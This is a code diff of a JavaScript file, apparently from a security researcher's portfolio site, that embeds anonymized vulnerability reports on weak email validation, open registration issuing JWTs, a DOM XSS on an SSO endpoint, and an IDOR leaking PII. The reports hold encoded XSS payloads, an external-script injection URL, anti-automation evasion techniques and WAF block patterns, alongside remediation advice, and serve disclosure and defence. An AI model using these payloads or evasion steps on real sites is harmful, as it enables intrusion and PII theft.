@@ -513,101 +513,82 @@ if r.status_code == 200 and "true" in r.text.lower():
      safeInjectReport('report-body', reportHtml);
   }
   // --- template placeholder per altri report ---
-   else if (id === 'logic') {
+   // --- LOGIC (Weak Email Validation) ---
+else if (id === 'logic') {
   const reportHtml = `
   <div class="post-content">
     <h1>Weak Email Validation & Lack of Anti-Automation Controls</h1>
-    <p><strong>Summary:</strong> During a security assessment of a public newsletter subscription API, I identified weak server-side email validation coupled with the absence of anti-automation controls. Two advanced obfuscated payloads bypassed validation and were accepted with <code>200 OK</code>, while the API allowed high-volume submissions without rate-limiting or bot mitigation. The combination enables dataset poisoning, large-scale automated abuse and downstream failures in systems that assume valid email inputs.</p>
+
+    <p><strong>Summary:</strong> During a security assessment of a public newsletter subscription API, I identified weak server-side email validation coupled with the absence of anti-automation controls. Two obfuscated payloads bypassed validation and were accepted with <code>200 OK</code>, while the API allowed high-volume submissions without rate-limiting or bot mitigation. The combination enables dataset poisoning, large-scale automated abuse and downstream failures.</p>
 
     <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Anonymous disclosure / responsible testing.</div>
 
     <h2>Pre-Engagement & Mapping</h2>
-    <p>Before any active testing, I performed systematic mapping of the public surface: enumerated endpoints, compared request/response patterns from the client application, and identified the public newsletter subscribe endpoint. The mapping phase highlighted a simple JSON API that accepted an email field and returned straightforward success/failure semantics. Understanding this surface was essential to design non-destructive tests and to constrain actions to in-scope behavior.</p>
+    <p>Before any active testing, I performed systematic mapping of the public surface: enumerated endpoints, compared request/response patterns from the client application, and identified the newsletter subscribe endpoint. This allowed safe, non-destructive tests limited to in-scope behavior.</p>
 
     <h2>Exploration & Discovery</h2>
-    <p>Initial tests showed most malformed inputs were rejected with <code>400/403</code> or similar. However, two obfuscation techniques — URL-encoded payloads containing encoded markup characters — were accepted and returned success. The endpoint also exhibited no enforcement of rate limits, no CAPTCHA, and no verification step (e.g. double opt-in), enabling automated submissions at scale.</p>
+    <p>Initial tests showed most malformed inputs were rejected (<code>400/403</code>). However, two obfuscation techniques — URL-encoded payloads containing encoded markup characters — were accepted. The endpoint also lacked rate limits, CAPTCHA, and verification (no double opt-in).</p>
 
-    <h2>Endpoint Behaviour (anonymized)</h2>
+    <h2>Endpoint behaviour (anonymized)</h2>
     <pre><code class="language-bash">
 POST https://&lt;media-host&gt;/api/newsletter/subscribe
 Body:
 { "email": "&lt;payload&gt;" }
     </code></pre>
 
-    <p>Observed response for bypassing payloads:</p>
-    <pre><code class="language-bash">
-HTTP/2 200 OK
-{ "status": "subscribed" }
-    </code></pre>
-
-    <h2>Bypassing Payloads (tested)</h2>
+    <h2>Bypassing payloads (examples)</h2>
     <ul>
       <li><code>%22%3E%3Csvg%2Fonload%3Dalert(1)%3E%22@example.com</code></li>
       <li><code>test+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E@example.com</code></li>
     </ul>
-    <p>These inputs include encoded characters that, when decoded or rendered downstream (e.g. in dashboards, previews or webhooks), could produce injection effects or break downstream parsers.</p>
 
     <h2>Proof of Concept — Controlled, Non-Destructive</h2>
+
     <h3>PoC 1 — Filter bypass & mass submission</h3>
     <ol>
-      <li>Construct a set of obfuscated email payloads (encoded XSS-like strings appended to a valid domain).</li>
+      <li>Construct obfuscated payloads.</li>
       <li>POST each payload to the subscribe endpoint with standard headers.</li>
-      <li>Log responses: accept (200) vs blocked (400/422/403).</li>
-      <li>Throttle requests to avoid accidental service disruption (e.g. 0.3–0.5s delay in tests).</li>
+      <li>Log acceptance (200) vs blocked (400/422/403).</li>
+      <li>Throttle to avoid service disruption (e.g. 0.3–0.5s).</li>
     </ol>
-    <p>Outcome: multiple encoded payloads were accepted as valid subscriptions. The script intentionally does not attempt to read or modify existing records — it only verifies acceptance semantics.</p>
+    <p>Outcome: multiple encoded payloads were accepted as valid subscriptions; the test does not read or modify third-party records.</p>
 
-    <h3>PoC 2 — Oracle enumeration via response-based behaviour</h3>
+    <h3>PoC 2 — Oracle enumeration via response timing/behaviour</h3>
     <ol>
-      <li>Create crafted variants of known email addresses (subaddressing, encoded suffixes).</li>
-      <li>POST a crafted address and observe the response code/behavior.</li>
-      <li>Resend or repeat requests to infer storage/deduplication and acceptance behavior.</li>
+      <li>Create crafted variants (subaddressing, encoded suffixes).</li>
+      <li>POST crafted address and observe response code/timing.</li>
+      <li>Repeat/resend to infer storage/deduplication semantics.</li>
     </ol>
-    <p>Outcome: differences in response codes and timings allow an attacker to build an oracle that infers whether certain addresses are stored, accepted, deduplicated or processed — enabling large-scale enumeration and verification attacks.</p>
+    <p>Outcome: response differences allow building an oracle for large-scale enumeration.</p>
 
     <h2>Automation & Evasion Techniques</h2>
     <ul>
-      <li>IP rotation (VPNs, proxy pools)</li>
-      <li>User-Agent randomization and fingerprint spoofing</li>
-      <li>Cookie reuse from publicly available sessions</li>
-      <li>Parallelized submission workers</li>
+      <li>IP rotation (proxy pools)</li>
+      <li>User-Agent and fingerprint spoofing</li>
+      <li>Cookie reuse and parallel workers</li>
     </ul>
 
-    <h2>Attack Scenarios & Business Impact</h2>
+    <h2>Attack scenarios & Business impact</h2>
     <ul>
-      <li><strong>Data poisoning:</strong> Invalid or malicious entries propagate to third-party providers.</li>
-      <li><strong>Downstream failures:</strong> Batch processing or exports may error on unexpected formats.</li>
-      <li><strong>GDPR & privacy risk:</strong> Increases surface for regulatory exposure.</li>
-      <li><strong>Reputational damage:</strong> Stored payloads can be abused for phishing.</li>
-      <li><strong>Enumeration & verification:</strong> Oracle enables scalable abuse.</li>
+      <li><strong>Data poisoning</strong>: malformed/ malicious entries propagate downstream.</li>
+      <li><strong>Downstream failures</strong>: exports, parsers and integrations may break.</li>
+      <li><strong>Enumeration & verification</strong>: oracle enables large-scale validation of lists.</li>
     </ul>
 
-    <h2>Severity Rationale</h2>
-    <p>The combination of persistent storage of attacker-controlled data, absence of mitigations, and oracle-style responses justifies a <strong>High</strong> severity classification. The risk grows substantially when leveraged at scale.</p>
-
-    <h2>Recommended Mitigations</h2>
+    <h2>Recommended mitigations</h2>
     <ul>
-      <li>Strict RFC-compliant validation.</li>
-      <li>Input normalization before storage.</li>
-      <li>Rate limiting and per-session throttling.</li>
-      <li>CAPTCHA / bot mitigation for public endpoints.</li>
-      <li>Double opt-in for subscriptions.</li>
-      <li>Audit downstream systems consuming the list.</li>
-      <li>Logging & anomaly detection for payload spikes.</li>
-    </ul>
-
-    <h2>Detection & Hardening Guidance</h2>
-    <ul>
-      <li>Flag HTML or URL-encoded characters in addresses.</li>
-      <li>Monitor high subscription rates per IP/session.</li>
-      <li>Detect repeated acceptance of malformed payloads.</li>
+      <li>Strict RFC-compliant server-side email validation.</li>
+      <li>Input normalization/decoding before validation and storage.</li>
+      <li>Rate limiting (per IP/account) and progressive throttling.</li>
+      <li>Anti-automation controls (CAPTCHA / challenge) for public flows.</li>
+      <li>Double opt-in before persisting or forwarding to third parties.</li>
     </ul>
 
     <blockquote>
-      <p>All tests were conducted ethically, using my own inputs and without accessing third-party data.</p>
+      <p>All tests were conducted ethically, using only synthetic inputs and test accounts where required.</p>
     </blockquote>
 
-    <h2>Appendix — Safe PoC Patterns</h2>
+    <h2>Appendix — Safe PoC Patterns (conceptual)</h2>
     <pre><code class="language-bash">
 payloads = [
   "%22%3E%3Csvg%2Fonload%3Dalert(1)%3E%22@example.com",
@@ -616,31 +597,33 @@ payloads = [
 
 for p in payloads:
   resp = POST "https://&lt;media-host&gt;/api/newsletter/subscribe" with json {"email": p}
-  log(p, resp.status_code, resp.body_summary)
-  sleep(0.3)  # throttled for safety
+  log(p, resp.status_code)
+  sleep(0.3)
     </code></pre>
   </div>
   `;
+
   safeInjectReport('report-body', reportHtml);
 }
 
-  else if (id === 'access') {
+// --- ACCESS (Improper Access Control / registration) ---
+else if (id === 'access') {
   const reportHtml = `
   <div class="post-content">
     <h1>Forensic Report — Improper Access Control on Registration API</h1>
-    <p><strong>Executive summary:</strong> During a targeted security assessment I identified a registration endpoint that issues confirmed accounts and valid JWT tokens immediately after an unauthenticated POST. The flow lacks verification (email/CAPTCHA), rate limiting, and header-origin restrictions. Publicly accessible frontend artifacts and admin routes were also discovered, enabling reconnaissance chaining. This document is written in a forensic, penetration-tester style and is fully anonymized.</p>
+
+    <p><strong>Executive summary:</strong> During a targeted assessment I identified a registration endpoint that issues confirmed accounts and valid JWTs immediately after an unauthenticated POST. The flow lacks verification (email/CAPTCHA), rate limiting, and origin restrictions. Public frontend artifacts and admin routes were also discovered, enabling reconnaissance chaining. All hosts and identifiers are anonymized.</p>
 
     <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Responsible disclosure; anonymized evidence.</div>
 
-    <h2>Pre-engagement</h2>
-    <p><strong>Scope:</strong> Public API surface and publicly served frontend assets only. No social engineering, no mass-account creation, no privileged actions performed.</p>
-    <p><strong>Rules of engagement:</strong> All actions limited to non-destructive verification. Only synthetic test accounts were created for confirmation. All sensitive values and hostnames are redacted in this report.</p>
+    <h2>Pre-engagement & Rules</h2>
+    <p><strong>Scope:</strong> public API & frontend assets only. No social engineering or destructive actions performed.</p>
 
     <h2>Information gathering</h2>
     <ol>
-      <li>Passive collection: crawl of public pages, inspection of served JS bundles and network traces from the client application.</li>
-      <li>Fingerprinting: identification of installed modules and plugin names from bundled artifacts.</li>
-      <li>Surface mapping: catalog of API endpoints and admin routes observable without authentication.</li>
+      <li>Passive collection: crawl public pages and inspect served JS bundles.</li>
+      <li>Fingerprinting: modules and plugin names from bundles.</li>
+      <li>Surface mapping: API endpoints and admin routes observable without auth.</li>
     </ol>
 
     <h2>Recon / Mapping results (anonymized)</h2>
@@ -650,18 +633,18 @@ GET  https://&lt;api-host&gt;/api/users/me
 GET  https://&lt;api-host&gt;/admin
 GET  https://&lt;api-host&gt;/api/admin/init
 JS bundles: main.&lt;hash&gt;.js, runtime.&lt;hash&gt;.js
-Identified modules (examples): users-permissions, content-type-builder, roles-permissions, upload, email, graphql
+Modules: users-permissions, roles-permissions, upload, email, graphql
     </code></pre>
 
     <h2>Exploration</h2>
     <ul>
-      <li>Unauthenticated POST returns a JSON body including <code>jwt</code> and a confirmed <code>user</code> object.</li>
-      <li><code>user.confirmed</code> is <code>true</code> immediately after registration.</li>
-      <li>Subsequent authenticated request with issued JWT returns full profile (<code>/api/users/me</code>).</li>
-      <li>Admin routes and frontend bundles retrievable anonymously.</li>
+      <li>Unauthenticated POST returns JSON containing <code>jwt</code> and a confirmed <code>user</code> object.</li>
+      <li><code>user.confirmed</code> appears <code>true</code> immediately after registration.</li>
+      <li>Using the issued JWT to GET <code>/api/users/me</code> returns a full profile.</li>
+      <li>Public admin bundles expose client logic references (e.g. <code>innerHTML</code>). </li>
     </ul>
 
-    <h2>Proof of Concept (PoC) — Controlled</h2>
+    <h2>PoC — Controlled, conceptual</h2>
     <pre><code class="language-bash">
 POST https://&lt;api-host&gt;/api/auth/local/register
 Body:
@@ -670,43 +653,261 @@ Body:
   "email": "test+forensic@example.test",
   "password": "ChangeMe123!"
 }
-# Response: 200 OK with jwt + user.confirmed=true
+# Expected: 200 OK with jwt + user.confirmed = true
     </code></pre>
 
-    <pre><code class="language-python">
-import requests
-
-url = "https://&lt;api-host&gt;/api/auth/local/register"
-payload = { "username": "forensic-test", "email": "forensic+1@example.test", "password": "ChangeMe123!" }
-r = requests.post(url, json=payload, timeout=10)
-# r.json() shows jwt and confirmed:true
-    </code></pre>
+    <h2>Forensic artifacts & recommended collection</h2>
+    <ul>
+      <li>API gateway / access logs for registration attempts (timestamps, IPs).</li>
+      <li>Application logs capturing token issuance and registration handler.</li>
+      <li>Auth service logs for JWT metadata (id, exp, alg).</li>
+      <li>Access logs for admin HTML/JS assets returned anonymously.</li>
+    </ul>
 
     <h2>Impact assessment</h2>
     <ul>
-      <li><strong>Automated account creation</strong>: attackers can mass-register accounts.</li>
-      <li><strong>Reconnaissance chaining</strong>: issued JWTs enable further probing.</li>
-      <li><strong>Service abuse</strong>: confirmed accounts may bypass workflows.</li>
-      <li><strong>Exposure of admin surface</strong>: increases attack surface.</li>
-      <li><strong>Potential privilege escalation</strong>: weak JWT handling raises risk.</li>
+      <li><strong>Automated account creation</strong>: easily scriptable mass registration.</li>
+      <li><strong>Reconnaissance chaining</strong>: issued tokens enable further probing.</li>
+      <li><strong>Service abuse</strong>: confirmed accounts bypass workflows.</li>
+      <li><strong>Admin surface exposure</strong>: public bundles increase attack surface.</li>
     </ul>
 
     <h2>Recommended remediation</h2>
     <ol>
-      <li>Require email confirmation before issuing full-scope JWTs.</li>
-      <li>Implement CAPTCHA and rate limiting on registration.</li>
-      <li>Restrict access to admin assets and bundles.</li>
-      <li>Harden JWT processing (strong algos, short expiry, revoke lists).</li>
-      <li>Audit client bundles to sanitize unsafe sinks.</li>
+      <li>Do not issue full-scope JWTs or mark users confirmed before verification.</li>
+      <li>Implement CAPTCHA + rate limiting on registration.</li>
+      <li>Restrict admin assets to authenticated/internal access.</li>
+      <li>Harden JWT processing (strong algos, short expiry, revocation).</li>
+      <li>Audit client bundles to remove unsafe sinks (innerHTML, eval).</li>
     </ol>
 
     <blockquote>
-      <p>Validation was limited to a single synthetic account creation. No mass-registration, brute force or escalation was attempted.</p>
+      <p>Validation limited to a single synthetic account creation; no mass actions were performed.</p>
     </blockquote>
   </div>
   `;
+
   safeInjectReport('report-body', reportHtml);
 }
+
+  else if (id === 'xss') {
+  const reportHtml = `
+  <div class="post-content">
+    <h1>Forensic Report — DOM XSS via GET Parameter on Authentication Flow</h1>
+
+    <p><strong>Executive summary:</strong> During targeted mapping of the single-sign-on surface I discovered a reflected DOM-based XSS vulnerability in an unauthenticated authentication endpoint. The issue is caused by insufficient sanitization of the <code>tabId</code> GET parameter, which is reflected into the page and executed by the browser. A crafted link is sufficient to trigger arbitrary script execution without user interaction. This report is anonymized and written in a forensic penetration-tester style.</p>
+
+    <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Responsible disclosure; all hosts and artefacts redacted.</div>
+
+    <h2>Pre-engagement</h2>
+    <p><strong>Scope:</strong> public SSO endpoints and frontend assets only. No social engineering or data exfiltration was performed.</p>
+    <p><strong>Rules:</strong> non-destructive verification with automated browser tooling and benign payloads (alerts/banners only).</p>
+
+    <h2>Information gathering</h2>
+    <ol>
+      <li>Crawled auth-related pages and captured client requests.</li>
+      <li>Retrieved and inspected frontend bundles.</li>
+      <li>Enumerated query parameters and traced their DOM/JS usage.</li>
+    </ol>
+
+    <h2>Mapping results (anonymized)</h2>
+    <pre><code class="language-bash">
+GET https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=&lt;value&gt;
+Observed reflected parameters: tabId, schema, displayLang, errorMessage
+    </code></pre>
+
+    <h2>Vulnerable endpoint (example payload)</h2>
+    <pre><code class="language-bash">
+GET https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=%3Cimg%20src%3Dx%20onerror%3Dalert(1337)%3E
+    </code></pre>
+    <p>Visiting this crafted URL caused immediate JavaScript execution (alert) without authentication or interaction.</p>
+
+    <h2>Proof of Concept — Controlled validation</h2>
+    <pre><code class="language-bash">
+https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=https%3A%2F%2F&lt;external-host&gt;%2Fchat.prod.js
+    </code></pre>
+    <p><strong>Hosted benign payload actions:</strong></p>
+    <ul>
+      <li>Triggered <code>alert()</code> to prove execution.</li>
+      <li>Inserted full-screen DOM banner (overlay attack).</li>
+      <li>Locked a DOM element to simulate denial-of-use.</li>
+    </ul>
+
+    <h2>Exploitability & Attack vector</h2>
+    <ul>
+      <li>No authentication or interaction required — crafted link = execution.</li>
+      <li>Reflected parameters inserted into HTML/JS without encoding.</li>
+      <li>External scripts can be hosted and invoked via the parameter.</li>
+    </ul>
+
+    <h2>Potential impact</h2>
+    <ul>
+      <li><strong>Session theft</strong> via injected scripts.</li>
+      <li><strong>Phishing overlays</strong> to capture credentials.</li>
+      <li><strong>Denial of service</strong> through persistent overlays or alert loops.</li>
+      <li><strong>Reputation damage</strong> from crafted malicious links.</li>
+    </ul>
+
+    <h2>Forensic evidence (recommended for triage)</h2>
+    <ul>
+      <li>Playwright logs, screenshots, demo video (timestamped).</li>
+      <li>HTTP logs for requests to <code>/user/auth/chooseschema</code>.</li>
+      <li>Frontend bundle versions/hashes served at test time.</li>
+      <li>DOM snapshots showing payload injection.</li>
+      <li>Network HAR trace including external script load.</li>
+    </ul>
+
+    <h2>Detection & Monitoring guidance</h2>
+    <ul>
+      <li>WAF rules: block <code>&lt;script&gt;</code>, <code>onerror</code> in query params.</li>
+      <li>Alert on suspicious encoded chars (<code>%3C</code>, <code>%3E</code>, <code>%22</code>).</li>
+      <li>Bundle fingerprint monitoring for reflection logic.</li>
+      <li>Synthetic monitoring for DOM integrity and response anomalies.</li>
+    </ul>
+
+    <h2>Remediation (prioritized)</h2>
+    <ol>
+      <li><strong>Sanitize & encode</strong> all user input before DOM insertion.</li>
+      <li><strong>Allowlist</strong> valid values for parameters like <code>tabId</code>.</li>
+      <li><strong>Avoid innerHTML</strong> with untrusted input — use safe DOM APIs.</li>
+      <li><strong>Content Security Policy</strong> to restrict inline/third-party scripts.</li>
+      <li><strong>Control static assets</strong> — pin origins and integrity hashes.</li>
+    </ol>
+
+    <h2>Safe validation PoC pattern</h2>
+    <pre><code class="language-bash">
+GET https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=%3Cmarker%3E
+# Confirm marker not executed as HTML/JS
+    </code></pre>
+
+    <blockquote>
+      <p>All validation was performed with benign payloads, limited to visual proof (alerts, banners). No secrets were accessed or exfiltrated.</p>
+    </blockquote>
+  </div>
+  `;
+
+  safeInjectReport('report-body', reportHtml);
+}
+
+    else if (id === 'idor2') {
+  const reportHtml = `
+  <div class="post-content">
+    <h1>Forensic Report — IDOR Leading to PII Exposure on Quote Resource</h1>
+
+    <p><strong>Executive summary:</strong> During a targeted assessment of the public quote creation flow I discovered an Insecure Direct Object Reference (IDOR) that allows unauthenticated retrieval of quote records by UUID. A created quote returns a UUID which can subsequently be queried via a GET request without any ownership check or session binding. The endpoint returns personally identifiable information (PII) fields (email, date of birth, postcode, client IP). This report is anonymized and written in a forensic penetration-tester style.</p>
+
+    <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Responsible disclosure; anonymized artifacts.</div>
+
+    <h2>Pre-engagement</h2>
+    <p><strong>Scope:</strong> public quote creation/retrieval endpoints and assets. No targeting of real users, only synthetic test data.</p>
+    <p><strong>Rules:</strong> Non-destructive verification only. Identifiers redacted.</p>
+
+    <h2>Information gathering</h2>
+    <ol>
+      <li>Manual interaction with the quote wizard to capture lifecycle.</li>
+      <li>Passive inspection of browser network traces.</li>
+      <li>Surface mapping: POST to create a quote, GET to retrieve by UUID.</li>
+    </ol>
+
+    <h2>Mapping results (anonymized)</h2>
+    <pre><code class="language-bash">
+POST https://&lt;api-host&gt;/api/quotes/
+Response: 201 Created
+Body: { "uuid": "&lt;uuid&gt;" }
+
+GET https://&lt;api-host&gt;/api/quotes/&lt;uuid&gt;
+Response: 200 OK -> returns PII fields:
+- driver_email
+- driver_date_of_birth
+- driver_address_postcode
+- ip_address
+    </code></pre>
+
+    <h2>Exploration & Verification</h2>
+    <p>External unauthenticated GETs returned full quote payloads. No ownership or session checks were enforced.</p>
+
+    <h2>Proof of Concept — Controlled</h2>
+    <pre><code class="language-bash">
+# 1) Create a quote (synthetic)
+POST https://&lt;api-host&gt;/api/quotes/ -> { "uuid": "&lt;uuid&gt;" }
+
+# 2) Retrieve without auth
+GET https://&lt;api-host&gt;/api/quotes/&lt;uuid&gt;
+# Response: 200 OK with PII (email, dob, postcode, ip)
+    </code></pre>
+
+    <h2>Automated validation & race tests</h2>
+    <ul>
+      <li>Batch creation + GET confirmed consistent behavior.</li>
+      <li>Parallel GETs showed reliable responses under concurrency.</li>
+    </ul>
+
+    <h2>Forensic evidence</h2>
+    <ul>
+      <li>HTTP pairs for POST and unauthenticated GET.</li>
+      <li>Browser HAR traces.</li>
+      <li>Server access logs to <code>/api/quotes/&lt;uuid&gt;</code>.</li>
+    </ul>
+
+    <h2>Security analysis</h2>
+    <ul>
+      <li>Access control absent: possession of UUID = access.</li>
+      <li>Reliance on UUID entropy is insufficient.</li>
+      <li>Leak channels include referrers, logs, shared links.</li>
+      <li>Constitutes GDPR/PII exposure risk.</li>
+    </ul>
+
+    <h2>Impact assessment</h2>
+    <ul>
+      <li><strong>PII disclosure:</strong> email, DOB, postcode, IP.</li>
+      <li><strong>Data scraping:</strong> mass harvesting possible with UUID lists.</li>
+      <li><strong>Phishing risk:</strong> PII usable for targeted fraud.</li>
+      <li><strong>Regulatory exposure:</strong> GDPR obligations triggered.</li>
+    </ul>
+
+    <h2>Attack scenarios</h2>
+    <ol>
+      <li>Obtain UUIDs via leaks/logs.</li>
+      <li>Script unauthenticated GETs to extract PII.</li>
+      <li>Parallelize with proxies to evade throttling.</li>
+      <li>Abuse harvested PII for fraud or phishing.</li>
+    </ol>
+
+    <h2>Recommended remediations</h2>
+    <ol>
+      <li><strong>Enforce access control</strong>: require auth & ownership checks.</li>
+      <li><strong>Short-lived tokens</strong>: signed URLs bound to context.</li>
+      <li><strong>Minimize PII</strong>: redact sensitive fields in public flows.</li>
+      <li><strong>Audit & log</strong> anomalous access to quotes.</li>
+      <li><strong>Rotate identifiers</strong> and avoid exposing persistent UUIDs.</li>
+      <li><strong>Rate limiting</strong> + abuse controls on endpoints.</li>
+    </ol>
+
+    <h2>Detection & forensic guidance</h2>
+    <ul>
+      <li>Collect request logs for <code>/api/quotes/*</code>.</li>
+      <li>Search for enumeration patterns and high-volume GETs.</li>
+      <li>Monitor for UUID leak channels.</li>
+      <li>Correlate POST creations with subsequent GETs.</li>
+    </ul>
+
+    <blockquote>
+      <p>All testing used synthetic data and was strictly non-destructive. No production UUID enumeration performed.</p>
+    </blockquote>
+
+    <h2>Appendix — Safe PoC</h2>
+    <pre><code class="language-bash">
+POST https://&lt;api-host&gt;/api/quotes/ -> { "uuid": "&lt;uuid&gt;" }
+
+GET https://&lt;api-host&gt;/api/quotes/&lt;uuid&gt;
+# Expected: 401/403 or minimal metadata, not full PII
+    </code></pre>
+  </div>
+  `;
+
+  safeInjectReport('report-body', reportHtml);
+}
+
 
 
 
